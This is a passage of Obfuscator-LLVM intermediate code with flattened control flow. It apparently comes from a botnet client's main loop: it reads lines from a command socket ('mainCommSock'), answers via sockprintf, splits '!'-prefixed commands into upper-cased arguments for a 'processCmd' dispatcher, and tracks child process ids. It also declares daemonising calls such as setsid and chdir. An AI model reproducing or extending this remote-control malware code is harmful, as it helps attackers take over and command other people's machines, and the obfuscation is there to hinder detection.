  %151 = zext i32 %150 to i64
  %152 = load i64, i64* @numpids, align 8
  %153 = icmp ult i64 %151, %152
  %154 = select i1 %153, i32 -184833720, i32 639654382
  store i32 %154, i32* %switchVar
  br label %loopEnd

; <label>:155:                                    ; preds = %loopEntry
  %156 = load i32*, i32** @pids, align 8
  %157 = load i32, i32* %19, align 4
  %158 = zext i32 %157 to i64
  %159 = getelementptr inbounds i32, i32* %156, i64 %158
  %160 = load i32, i32* %159, align 4
  %161 = load i32*, i32** %18, align 8
  %162 = load i32, i32* %19, align 4
  %163 = zext i32 %162 to i64
  %164 = getelementptr inbounds i32, i32* %161, i64 %163
  store i32 %160, i32* %164, align 4
  store i32 1987345501, i32* %switchVar
  br label %loopEnd

; <label>:165:                                    ; preds = %loopEntry
  %166 = load i32, i32* %19, align 4
  %167 = add i32 %166, 1
  store i32 %167, i32* %19, align 4
  store i32 2017418957, i32* %switchVar
  br label %loopEnd

; <label>:168:                                    ; preds = %loopEntry
  %169 = load i32*, i32** @pids, align 8
  %170 = bitcast i32* %169 to i8*
  call void @free(i8* %170) #2
  %171 = load i32*, i32** %18, align 8
  store i32* %171, i32** @pids, align 8
  store i32 826151506, i32* %switchVar
  br label %loopEnd

; <label>:172:                                    ; preds = %loopEntry
  store i32 -733163582, i32* %switchVar
  br label %loopEnd

; <label>:173:                                    ; preds = %loopEntry
  %174 = load i32, i32* %17, align 4
  %175 = add nsw i32 %174, 1
  store i32 %175, i32* %17, align 4
  store i32 696393759, i32* %switchVar
  br label %loopEnd

; <label>:176:                                    ; preds = %loopEntry
  %177 = load i32, i32* %16, align 4
  %178 = sext i32 %177 to i64
  %179 = getelementptr inbounds [4096 x i8], [4096 x i8]* %15, i64 0, i64 %178
  store i8 0, i8* %179, align 1
  %180 = getelementptr inbounds [4096 x i8], [4096 x i8]* %15, i32 0, i32 0
  call void @trim(i8* %180)
  %181 = getelementptr inbounds [4096 x i8], [4096 x i8]* %15, i32 0, i32 0
  %182 = call i8* @strstr(i8* %181, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.58, i32 0, i32 0)) #10
  %183 = getelementptr inbounds [4096 x i8], [4096 x i8]* %15, i32 0, i32 0
  %184 = icmp eq i8* %182, %183
  %185 = select i1 %184, i32 -573664080, i32 1231678413
  store i32 %185, i32* %switchVar
  br label %loopEnd

; <label>:186:                                    ; preds = %loopEntry
  %187 = load i32, i32* @mainCommSock, align 4
  %188 = call i32 (i32, i8*, ...) @sockprintf(i32 %187, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.82, i32 0, i32 0))
  store i32 -400179953, i32* %switchVar
  br label %loopEnd

; <label>:189:                                    ; preds = %loopEntry
  %190 = getelementptr inbounds [4096 x i8], [4096 x i8]* %15, i32 0, i32 0
  %191 = call i8* @strstr(i8* %190, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.83, i32 0, i32 0)) #10
  %192 = getelementptr inbounds [4096 x i8], [4096 x i8]* %15, i32 0, i32 0
  %193 = icmp eq i8* %191, %192
  %194 = select i1 %193, i32 1921759130, i32 -581294868
  store i32 %194, i32* %switchVar
  br label %loopEnd

; <label>:195:                                    ; preds = %loopEntry
  call void @exit(i32 0) #14
  unreachable

; <label>:196:                                    ; preds = %loopEntry
  %197 = getelementptr inbounds [4096 x i8], [4096 x i8]* %15, i32 0, i32 0
  store i8* %197, i8** %20, align 8
  %198 = load i8*, i8** %20, align 8
  %199 = load i8, i8* %198, align 1
  %200 = zext i8 %199 to i32
  %201 = icmp eq i32 %200, 33
  %202 = select i1 %201, i32 -633964847, i32 -2060640576
  store i32 %202, i32* %switchVar
  br label %loopEnd

; <label>:203:                                    ; preds = %loopEntry
  %204 = load i8*, i8** %20, align 8
  %205 = getelementptr inbounds i8, i8* %204, i64 1
  store i8* %205, i8** %21, align 8
  store i32 401831863, i32* %switchVar
  br label %loopEnd

; <label>:206:                                    ; preds = %loopEntry
  %207 = load i8*, i8** %21, align 8
  %208 = load i8, i8* %207, align 1
  %209 = zext i8 %208 to i32
  %210 = icmp ne i32 %209, 32
  %211 = select i1 %210, i32 -1709488649, i32 -178949984
  store i32 %211, i32* %switchVar
  store i1 false, i1* %.reg2mem3
  br label %loopEnd

; <label>:212:                                    ; preds = %loopEntry
  %213 = load i8*, i8** %21, align 8
  %214 = load i8, i8* %213, align 1
  %215 = zext i8 %214 to i32
  %216 = icmp ne i32 %215, 0
  store i32 -178949984, i32* %switchVar
  store i1 %216, i1* %.reg2mem3
  br label %loopEnd

; <label>:217:                                    ; preds = %loopEntry
  %.reload4 = load i1, i1* %.reg2mem3
  %218 = select i1 %.reload4, i32 -976735557, i32 -1151476160
  store i32 %218, i32* %switchVar
  br label %loopEnd

; <label>:219:                                    ; preds = %loopEntry
  %220 = load i8*, i8** %21, align 8
  %221 = getelementptr inbounds i8, i8* %220, i32 1
  store i8* %221, i8** %21, align 8
  store i32 401831863, i32* %switchVar
  br label %loopEnd

; <label>:222:                                    ; preds = %loopEntry
  %223 = load i8*, i8** %21, align 8
  %224 = load i8, i8* %223, align 1
  %225 = zext i8 %224 to i32
  %226 = icmp eq i32 %225, 0
  %227 = select i1 %226, i32 204724885, i32 -830601617
  store i32 %227, i32* %switchVar
  br label %loopEnd

; <label>:228:                                    ; preds = %loopEntry
  store i32 -400179953, i32* %switchVar
  br label %loopEnd

; <label>:229:                                    ; preds = %loopEntry
  %230 = load i8*, i8** %21, align 8
  store i8 0, i8* %230, align 1
  %231 = load i8*, i8** %20, align 8
  %232 = getelementptr inbounds i8, i8* %231, i64 1
  store i8* %232, i8** %21, align 8
  %233 = load i8*, i8** %20, align 8
  %234 = load i8*, i8** %21, align 8
  %235 = call i64 @strlen(i8* %234) #10
  %236 = getelementptr inbounds i8, i8* %233, i64 %235
  %237 = getelementptr inbounds i8, i8* %236, i64 2
  store i8* %237, i8** %20, align 8
  store i32 1786359480, i32* %switchVar
  br label %loopEnd

; <label>:238:                                    ; preds = %loopEntry
  %239 = load i8*, i8** %20, align 8
  %240 = load i8*, i8** %20, align 8
  %241 = call i64 @strlen(i8* %240) #10
  %242 = sub i64 %241, 1
  %243 = getelementptr inbounds i8, i8* %239, i64 %242
  %244 = load i8, i8* %243, align 1
  %245 = zext i8 %244 to i32
  %246 = icmp eq i32 %245, 10
  %247 = select i1 %246, i32 -232538637, i32 1147994544
  store i32 %247, i32* %switchVar
  store i1 true, i1* %.reg2mem5
  br label %loopEnd

; <label>:248:                                    ; preds = %loopEntry
  %249 = load i8*, i8** %20, align 8
  %250 = load i8*, i8** %20, align 8
  %251 = call i64 @strlen(i8* %250) #10
  %252 = sub i64 %251, 1
  %253 = getelementptr inbounds i8, i8* %249, i64 %252
  %254 = load i8, i8* %253, align 1
  %255 = zext i8 %254 to i32
  %256 = icmp eq i32 %255, 13
  store i32 -232538637, i32* %switchVar
  store i1 %256, i1* %.reg2mem5
  br label %loopEnd

; <label>:257:                                    ; preds = %loopEntry
  %.reload6 = load i1, i1* %.reg2mem5
  %258 = select i1 %.reload6, i32 -381029224, i32 178780686
  store i32 %258, i32* %switchVar
  br label %loopEnd

; <label>:259:                                    ; preds = %loopEntry
  %260 = load i8*, i8** %20, align 8
  %261 = load i8*, i8** %20, align 8
  %262 = call i64 @strlen(i8* %261) #10
  %263 = sub i64 %262, 1
  %264 = getelementptr inbounds i8, i8* %260, i64 %263
  store i8 0, i8* %264, align 1
  store i32 1786359480, i32* %switchVar
  br label %loopEnd

; <label>:265:                                    ; preds = %loopEntry
  %266 = load i8*, i8** %20, align 8
  store i8* %266, i8** %22, align 8
  store i32 400199495, i32* %switchVar
  br label %loopEnd

; <label>:267:                                    ; preds = %loopEntry
  %268 = load i8*, i8** %20, align 8
  %269 = load i8, i8* %268, align 1
  %270 = zext i8 %269 to i32
  %271 = icmp ne i32 %270, 32
  %272 = select i1 %271, i32 289676771, i32 -1432384093
  store i32 %272, i32* %switchVar
  store i1 false, i1* %.reg2mem7
  br label %loopEnd

; <label>:273:                                    ; preds = %loopEntry
  %274 = load i8*, i8** %20, align 8
  %275 = load i8, i8* %274, align 1
  %276 = zext i8 %275 to i32
  %277 = icmp ne i32 %276, 0
  store i32 -1432384093, i32* %switchVar
  store i1 %277, i1* %.reg2mem7
  br label %loopEnd

; <label>:278:                                    ; preds = %loopEntry
  %.reload8 = load i1, i1* %.reg2mem7
  %279 = select i1 %.reload8, i32 1585948505, i32 351863942
  store i32 %279, i32* %switchVar
  br label %loopEnd

; <label>:280:                                    ; preds = %loopEntry
  %281 = load i8*, i8** %20, align 8
  %282 = getelementptr inbounds i8, i8* %281, i32 1
  store i8* %282, i8** %20, align 8
  store i32 400199495, i32* %switchVar
  br label %loopEnd

; <label>:283:                                    ; preds = %loopEntry
  %284 = load i8*, i8** %20, align 8
  store i8 0, i8* %284, align 1
  %285 = load i8*, i8** %20, align 8
  %286 = getelementptr inbounds i8, i8* %285, i32 1
  store i8* %286, i8** %20, align 8
  %287 = load i8*, i8** %22, align 8
  store i8* %287, i8** %23, align 8
  store i32 -1758501687, i32* %switchVar
  br label %loopEnd

; <label>:288:                                    ; preds = %loopEntry
  %289 = load i8*, i8** %23, align 8
  %290 = load i8, i8* %289, align 1
  %291 = icmp ne i8 %290, 0
  %292 = select i1 %291, i32 -698627327, i32 1905617591
  store i32 %292, i32* %switchVar
  br label %loopEnd

; <label>:293:                                    ; preds = %loopEntry
  %294 = load i8*, i8** %23, align 8
  %295 = load i8, i8* %294, align 1
  %296 = zext i8 %295 to i32
  %297 = call i32 @toupper(i32 %296) #10
  %298 = trunc i32 %297 to i8
  %299 = load i8*, i8** %23, align 8
  store i8 %298, i8* %299, align 1
  %300 = load i8*, i8** %23, align 8
  %301 = getelementptr inbounds i8, i8* %300, i32 1
  store i8* %301, i8** %23, align 8
  store i32 -1758501687, i32* %switchVar
  br label %loopEnd

; <label>:302:                                    ; preds = %loopEntry
  store i32 1, i32* %25, align 4
  %303 = load i8*, i8** %20, align 8
  %304 = call i8* @strtok(i8* %303, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #2
  store i8* %304, i8** %26, align 8
  %305 = load i8*, i8** %22, align 8
  %306 = getelementptr inbounds [10 x i8*], [10 x i8*]* %24, i64 0, i64 0
  store i8* %305, i8** %306, align 16
  store i32 593964455, i32* %switchVar
  br label %loopEnd

; <label>:307:                                    ; preds = %loopEntry
  %308 = load i8*, i8** %26, align 8
  %309 = icmp ne i8* %308, null
  %310 = select i1 %309, i32 528726967, i32 -1076626947
  store i32 %310, i32* %switchVar
  br label %loopEnd

; <label>:311:                                    ; preds = %loopEntry
  %312 = load i8*, i8** %26, align 8
  %313 = load i8, i8* %312, align 1
  %314 = zext i8 %313 to i32
  %315 = icmp ne i32 %314, 10
  %316 = select i1 %315, i32 1635495183, i32 792624128
  store i32 %316, i32* %switchVar
  br label %loopEnd

; <label>:317:                                    ; preds = %loopEntry
  %318 = load i8*, i8** %26, align 8
  %319 = call i64 @strlen(i8* %318) #10
  %320 = add i64 %319, 1
  %321 = call noalias i8* @malloc(i64 %320) #2
  %322 = load i32, i32* %25, align 4
  %323 = sext i32 %322 to i64
  %324 = getelementptr inbounds [10 x i8*], [10 x i8*]* %24, i64 0, i64 %323
  store i8* %321, i8** %324, align 8
  %325 = load i32, i32* %25, align 4
  %326 = sext i32 %325 to i64
  %327 = getelementptr inbounds [10 x i8*], [10 x i8*]* %24, i64 0, i64 %326
  %328 = load i8*, i8** %327, align 8
  %329 = load i8*, i8** %26, align 8
  %330 = call i64 @strlen(i8* %329) #10
  %331 = add i64 %330, 1
  call void @llvm.memset.p0i8.i64(i8* %328, i8 0, i64 %331, i32 1, i1 false)
  %332 = load i32, i32* %25, align 4
  %333 = sext i32 %332 to i64
  %334 = getelementptr inbounds [10 x i8*], [10 x i8*]* %24, i64 0, i64 %333
  %335 = load i8*, i8** %334, align 8
  %336 = load i8*, i8** %26, align 8
  %337 = call i8* @strcpy(i8* %335, i8* %336) #2
  %338 = load i32, i32* %25, align 4
  %339 = add nsw i32 %338, 1
  store i32 %339, i32* %25, align 4
  store i32 792624128, i32* %switchVar
  br label %loopEnd

; <label>:340:                                    ; preds = %loopEntry
  %341 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #2
  store i8* %341, i8** %26, align 8
  store i32 593964455, i32* %switchVar
  br label %loopEnd

; <label>:342:                                    ; preds = %loopEntry
  %343 = load i32, i32* %25, align 4
  %344 = getelementptr inbounds [10 x i8*], [10 x i8*]* %24, i32 0, i32 0
  call void @processCmd(i32 %343, i8** %344)
  %345 = load i32, i32* %25, align 4
  %346 = icmp sgt i32 %345, 1
  %347 = select i1 %346, i32 908554594, i32 497104837
  store i32 %347, i32* %switchVar
  br label %loopEnd

; <label>:348:                                    ; preds = %loopEntry
  store i32 1, i32* %27, align 4
  store i32 1, i32* %27, align 4
  store i32 -1956777179, i32* %switchVar
  br label %loopEnd

; <label>:349:                                    ; preds = %loopEntry
  %350 = load i32, i32* %27, align 4
  %351 = load i32, i32* %25, align 4
  %352 = icmp slt i32 %350, %351
  %353 = select i1 %352, i32 -1727833956, i32 961242140
  store i32 %353, i32* %switchVar
  br label %loopEnd

; <label>:354:                                    ; preds = %loopEntry
  %355 = load i32, i32* %27, align 4
  %356 = sext i32 %355 to i64
  %357 = getelementptr inbounds [10 x i8*], [10 x i8*]* %24, i64 0, i64 %356
  %358 = load i8*, i8** %357, align 8
  call void @free(i8* %358) #2
  store i32 779954150, i32* %switchVar
  br label %loopEnd

; <label>:359:                                    ; preds = %loopEntry
  %360 = load i32, i32* %27, align 4
  %361 = add nsw i32 %360, 1
  store i32 %361, i32* %27, align 4
  store i32 -1956777179, i32* %switchVar
  br label %loopEnd

; <label>:362:                                    ; preds = %loopEntry
  store i32 497104837, i32* %switchVar
  br label %loopEnd

; <label>:363:                                    ; preds = %loopEntry
  store i32 -2060640576, i32* %switchVar
  br label %loopEnd

; <label>:364:                                    ; preds = %loopEntry
  store i32 -400179953, i32* %switchVar
  br label %loopEnd

; <label>:365:                                    ; preds = %loopEntry
  store i32 948891894, i32* %switchVar
  br label %loopEnd

; <label>:366:                                    ; preds = %loopEntry
  %367 = load i32, i32* %3, align 4
  ret i32 %367

loopEnd:                                          ; preds = %365, %364, %363, %362, %359, %354, %349, %348, %342, %340, %317, %311, %307, %302, %293, %288, %283, %280, %278, %273, %267, %265, %259, %257, %248, %238, %229, %228, %222, %219, %217, %212, %206, %203, %196, %189, %186, %176, %173, %172, %168, %165, %155, %149, %136, %133, %122, %116, %113, %104, %98, %97, %91, %90, %88, %84, %80, %79, %77, %76, %75, %73, %72, %68, %63, %59, %first, %switchDefault
  br label %loopEntry
}

declare %struct._IO_FILE* @fopen(i8*, i8*) #3

declare i64 @fwrite(i8*, i64, i64, %struct._IO_FILE*) #3

; Function Attrs: nounwind
declare i32 @fileno(%struct._IO_FILE*) #4

declare i32 @fchmod(...) #3

declare i32 @fclose(%struct._IO_FILE*) #3

; Function Attrs: nounwind
declare i32 @setsid() #4

; Function Attrs: nounwind
declare i32 @chdir(i8*) #4

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #4

declare i32 @sleep(i32) #3

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind returns_twice "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { nounwind readonly }
attributes #11 = { nounwind returns_twice }
attributes #12 = { noreturn }
attributes #13 = { nounwind readnone }
attributes #14 = { noreturn nounwind }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146623954}
!2 = !{i32 -2146623263}
!3 = !{i32 -2146622514}
!4 = !{i32 -2146621691}
!5 = !{i32 -2146620881}
!6 = !{i32 -2146619630}
